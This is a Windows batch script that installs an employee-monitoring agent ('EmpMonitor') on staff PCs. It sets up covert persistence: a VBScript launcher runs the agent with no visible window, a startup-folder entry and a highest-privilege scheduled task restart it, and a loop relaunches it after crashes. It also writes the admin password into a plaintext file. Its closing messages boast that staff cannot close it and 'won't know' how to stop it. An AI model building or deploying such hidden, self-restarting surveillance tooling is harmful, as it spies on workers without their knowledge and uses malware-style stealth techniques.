@echo off
:: ============================================================
:: EmpMonitor — Background Setup (Run ONCE on staff PC)
:: ============================================================
:: This makes the agent run hidden + auto-start on boot
:: Right-click this file -> Run as administrator
:: ============================================================

title EmpMonitor Setup
color 0A

echo.
echo  =====================================================
echo   EmpMonitor — Background Agent Setup
echo  =====================================================
echo.

:: Get configuration
set /p SERVER_URL="  Server URL (e.g. http://192.168.1.186:3001): "
set /p EMPLOYEE_NAME="  Employee Name (e.g. Dhina): "
set /p ADMIN_PASSWORD="  Admin Password: "

echo.
echo  Setting up for: %EMPLOYEE_NAME%
echo  Server: %SERVER_URL%
echo.

:: Create install directory
set INSTALL_DIR=%USERPROFILE%\EmpMonitor
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Copy agent.js to install directory
copy /Y "%~dp0agent.js" "%INSTALL_DIR%\agent.js" >nul 2>&1
if not exist "%INSTALL_DIR%\agent.js" (
    echo  [ERROR] agent.js not found! Put agent.js in the same folder as this file.
    pause
    exit /b 1
)
echo  [OK] Agent installed to %INSTALL_DIR%

:: Create the start script (restarts if it crashes)
(
echo @echo off
echo :loop
echo node "%INSTALL_DIR%\agent.js" "%SERVER_URL%" "%EMPLOYEE_NAME%" "%ADMIN_PASSWORD%"
echo timeout /t 10 /nobreak ^>nul
echo goto loop
) > "%INSTALL_DIR%\start.bat"

:: Create hidden launcher (VBScript - runs with NO visible window)
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run """%INSTALL_DIR%\start.bat""", 0, False
) > "%INSTALL_DIR%\hidden-start.vbs"

echo  [OK] Hidden launcher created

:: Add to Windows Startup folder (runs on login)
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy /Y "%INSTALL_DIR%\hidden-start.vbs" "%STARTUP_DIR%\EmpMonitor.vbs" >nul 2>&1
echo  [OK] Auto-start on Windows boot enabled

:: Create Task Scheduler entry (backup method)
schtasks /delete /tn "EmpMonitor" /f >nul 2>&1
schtasks /create /tn "EmpMonitor" /tr "wscript.exe \"%INSTALL_DIR%\hidden-start.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
echo  [OK] Task Scheduler backup created

:: Start it NOW (hidden)
start "" wscript.exe "%INSTALL_DIR%\hidden-start.vbs"
echo  [OK] Agent started in background (HIDDEN)

echo.
echo  =====================================================
echo   SETUP COMPLETE!
echo  =====================================================
echo.
echo   The agent is now:
echo     - Running HIDDEN in background (no window visible)
echo     - Will auto-start when Windows boots
echo     - Cannot be closed by staff (no window to close!)
echo     - Sending data to: %SERVER_URL%
echo.
echo   To STOP it: Open Task Manager ^> find "node.exe" ^> End Task
echo   But staff won't know to do this.
echo.
pause
